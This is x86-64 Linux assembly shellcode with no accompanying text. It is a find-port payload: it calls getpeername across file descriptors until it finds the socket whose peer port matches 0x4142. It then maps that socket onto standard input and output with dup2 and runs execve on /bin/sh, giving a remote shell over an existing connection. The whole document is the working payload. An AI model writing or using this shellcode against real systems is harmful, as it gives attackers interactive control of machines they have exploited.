global _start


_start:


            xor rdi,rdi
            xor rbx,rbx
            mov bl,0x14
            sub rsp,rbx
            lea rdx,[rsp]
            lea rsi,[rsp+4]
          find_port:
            push 0x34     ; getpeername
            pop rax
            syscall
            inc di
            cmp word [rsi+2],0x4142
            jne find_port
            dec di
            push 2
            pop rsi
          dup2:
            push 0x21     ; dup2
            pop rax
            syscall
            dec rsi
            jns dup2
            mov rbx,rsi
            mov ebx, 0x68732f41
            mov eax,0x6e69622f
            shr rbx,8
            shl rbx,32
            or  rax,rbx
            push rax
            mov rdi,rsp
            xor rsi,rsi
            mov rdx,rsi
            push 0x3b     ; execve
            pop rax
            syscall
